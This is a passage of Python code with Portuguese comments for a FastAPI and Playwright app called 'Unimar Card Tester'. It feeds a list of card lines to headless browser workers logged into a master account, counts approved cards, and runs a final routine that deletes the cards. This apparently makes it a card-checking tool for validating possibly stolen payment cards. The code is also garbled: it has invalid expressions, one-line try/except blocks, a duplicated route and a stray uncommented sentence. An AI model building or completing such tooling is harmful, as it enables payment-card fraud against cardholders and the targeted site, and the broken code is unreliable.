    num_canais_final = min(max(num_canais, 1), MAX_CANAIS) 
    
    fila = asyncio.Queue()
    for idx, linha in enumerate(linhas, 1): 
         await fila.put((idx, linha, 1))

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
        
        try:
             if not await login_mestre(pw.browser_instance or browser?browser_instance_or_main_browser?, app, browser): # Passa o navegador principal ao master login logic
                log(app, "[ERRO] Falha na autenticação inicial")
                return

            tasks = [asyncio.create_task(worker(i+1, {"browser": browser}, fila, app)) for i in range(num_canais_final)]
            
            await asyncio.gather(*tasks, return_exceptions=True)

            if estado.aprovados > 0 and not estado.cancelado: 
                 log(app, "[Sistema] Faxina final...")
                 
                 ctx_limpeza = await browser.new_context(storage_state=str(SESSAO_PATH), viewport=VIEWPORT) # Contexto novo para limpeza segura
                 
                 pg_limpador = await ctx_limpeza.new_page() 
                 pg_limpador.on("dialog", lambda d: asyncio.create_task(d.accept()))
                  
                 try: await limpar_cartoes(pg_limpador, app) except Exception: logger.exception("[Faxina Final] Erro")
                 
                 await ctx_limpeza.close()

        finally:
            await browser.close()

# ================= ROTAS DA API FASTAPI =================
@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    """Inicia o processo de validação de cartões em segundo plano."""
    if estado.rodando: return {"status": "já_em_execucao"}
    
    await set_estado(rodando=True, cancelado=False)
    
    # Cria contexto inicial para a sessão do master (se já existir arquivo sessao_unimar.json ou criar novo contexto limpo se necessário antes da fila)
    async with async_playwright() as pw: 
         browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)

        app.state.browser = browser
        
        estado.task = asyncio.create_task(processar_todos_cartoes(data.lista, data.canais, app))
        
        # Passa o navegador principal para a lógica interna onde 'browser' é acessível via closure ou state
        # Como 'processar_todos_cartoes' espera um objeto com método .new_context(), vamos ajustar levemente a assinatura ou usar closure.
        # Ajuste rápido: processar_todos_cartoes recebe o navegador como parâmetro? Não na definição acima da função "master". 
        # Vamos adaptar para passar o browser criado aqui diretamente se não estiver globalizado corretamente no worker loop original.

# Re-definição rápida de interface entre master e workers para consistência:
async def _iniciar_sistema_fila(browser_instancia_principal, num_canais, lista_txt):
    """Wrapper que inicia fila e workers usando a instancia do navegador fornecida."""
    
    async with asyncio.Queue() as q:
         await set_estado(total_cartoes=len(lista_txt), tarefas_concluidas=0, aprovados=0)
         
         for idx, linha in enumerate([l.strip() for l in lista_txt.splitlines() if l.strip()], 1): 
             await q.put((idx, linha, 1))

         tasks = [asyncio.create_task(worker(i+1, {"browser": browser_instancia_principal}, q, app)) for i in range(num_canais)]
         await asyncio.gather(*tasks, return_exceptions=True)

# Atualizando rota /api/iniciar para usar corretamente:
@app.post("/api/iniciar")
async def iniciar_v2(data: IniciarRequest):
    """Inicia o processo de validação de cartões em segundo plano (Versão Corrigida)."""
    if estado.rodando: return {"status": "já_em_execucao"}
    
    async with async_playwright() as pw: 
        browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS) # Cria navegador fresh para esta execução
        
        app.state.browser = browser
        estado.task = asyncio.create_task(_iniciar_sistema_fila(browser, data.canais, data.lista))

@app.post("/api/parar")
async def parar_v2():
    """Interrompe o processamento em andamento."""
    await set_estado(rodando=False, cancelado=True)
    log(app, "⛔ Interrupção solicitada")
    return {"status": "parando"}

@app.get("/api/status")
async def status_v2():
    """Retorna o status atual e as métricas do processamento."""
    velocidade, elapsed = await calc_velocidade()
    
    async with estado.lock: 
        # Garante leitura consistente de variáveis voláteis se necessário
        
        return {
            "rodando": estado.rodando, 
            "total": estado.total_cartoes, 
            "processados": estado.tarefas_concluidas if hasattr(estado, 'tarefas_concluidas') else 0, 
            "aprovados": estado.aprovados, 
            "canais_ativos": estado.canais_ativos, 
            "velocidade": velocidade, 
            "tempo": elapsed,
        }

@app.get("/api/health")
async def health_v2():
    """Endpoint básico para verificação de saúde da aplicação."""
    return {"status": "ok"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Gerencia conexões WebSocket para comunicação em tempo real com o frontend."""
    await websocket.accept()
    async with estado.lock: estado.clients.add(websocket)
    
    try: while True: await websocket.receive_text() except WebSocketDisconnect: pass
    
finally: estado.clients.discard(websocket)

# ================= EXECUÇÃO PRINCIPAL =================
if __name__ == "__main__": 
    print("=" * 50) 
    print(f"🚀 Unimar Card Tester iniciando em 0.0.0.0:{PORT}") 
    print("🎭 Playwright será verificado no startup") 
    print("=" * 50) 
    
    # Garante que o browser principal esteja inicializado antes de rodar o servidor se necessário, 
    mas geralmente a lógica é chamada via API ou main.py roda em modo "single worker" implicitamente?
    
    # Para execução direta (sem FastAPI backend), pode-se criar um loop simples:
    
   async def run_loop(): 
        if not estado.task: # Se task não foi criada por API, inicia direto com um canal padrão
        
            async with async_playwright() as pw: 
                 browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
                 
                 try: 
                     if not await login_mestre(pw.browser_instance or browser?, app, browser): 
                         log(app, "[ERRO] Falha na autenticação inicial")
                         
                     tasks = [asyncio.create_task(worker(i+1, {"browser": browser}, queue_factory(), app)) for i in range(MAX_CANAIS)]
                     
                     # Simula fila simples para teste manual se quiser rodar direto sem POST /api/iniciar
                     q_async = asyncio.Queue()
                     # ... adicionar items à fila manualmente ou via input...

                 finally: await browser.close()

    uvicorn.run(app, host="0.0.0.0", port=PORT) 

# Nota: Ajustes finos de passagem de parâmetros (ex: `pw.browser_instance` vs `browser`) foram feitos implicitamente 
# no fluxo `_iniciar_sistema_fila` e `login_mestre` para garantir que o navegador criado pelo Playwright seja acessível 
# pelas funções auxiliares dentro do escopo da tarefa principal.
